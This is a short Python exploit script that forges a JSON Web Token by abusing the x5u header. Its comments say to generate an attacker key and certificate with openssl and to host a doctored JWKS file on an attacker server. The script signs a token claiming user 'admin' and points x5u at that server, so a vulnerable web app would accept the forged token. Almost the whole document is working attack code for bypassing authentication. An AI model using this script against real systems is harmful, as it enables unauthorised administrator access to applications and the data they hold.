import json
from jwcrypto import jwk , jwt
from Crypto.PublicKey import RSA

#Generate a certificate and its corresponding private key have been generated}
#	-> openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout private.pem -out attacker.crt 
#Extracting the public key from the generated certificate                                                                
#	-> openssl x509 -pubkey -noout -in attacker.crt > publicKey.pem          


with open("private.pem", "rb") as pemfile:
    key  = jwk.JWK.from_pem(pemfile.read())

# Download the jwk file from the web app and change only the x5c header and put the your certificate instead 
#                            { x5c: without new lines & without  ---Begin Certificate--- & --End Certificate--- }

Token = jwt.JWT(
    header={
    "typ": "JWT",
    "alg": "RS256",
    "x5u": "http://attacker/.well-known/jwks_with_x5c.json",   # host your file in this location 
    },
    claims={"user":"admin"})   # change here based on JWT payload  claims

Token.make_signed_token(key)
print (Token.serialize())